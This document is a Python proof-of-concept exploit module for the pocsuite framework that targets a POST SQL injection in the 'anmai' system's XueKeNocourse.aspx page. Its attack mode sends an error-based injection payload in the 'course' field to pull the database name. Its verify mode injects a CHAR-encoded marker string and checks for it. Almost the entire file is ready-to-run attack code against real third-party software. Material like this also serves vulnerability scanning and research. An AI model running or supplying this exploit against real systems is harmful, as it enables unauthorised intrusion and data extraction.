#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'anmai POST sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=108502']
    desc = '''anmai POST注入'''

    vulDate = '2015-04-13'
    createDate = '2019-04-11'
    updateDate = '2019-04-11'

    appName = 'anmai'
    appVersion = '正式版'
    appPowerLink = 'http://www.anmai.net/'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.post(self.url)
        self.url = self.url.strip('/') + "/time/shezhiSystem/XueKeNocourse.aspx"
        data = {
            'course': "' and (char(126)+DB_NAME()+char(126))>0--"
        }
        resp = s.post(self.url, data=data)
        dbname = re.search('~(.*?)~', resp.content)
        if dbname:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/time/shezhiSystem/XueKeNocourse.aspx"
        data = {
            'course':"1' and (CHAR(115)+CHAR(104)+CHAR(117)+CHAR(90)+CHAR(73)+CHAR(103)+CHAR(117)+CHAR(97)+CHAR(110)+CHAR(88)+CHAR(73)+CHAR(78)+CHAR(71))>0--"
        }
        resp = s.post(self.url, data=data)
        if 'shuZIguanXING' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

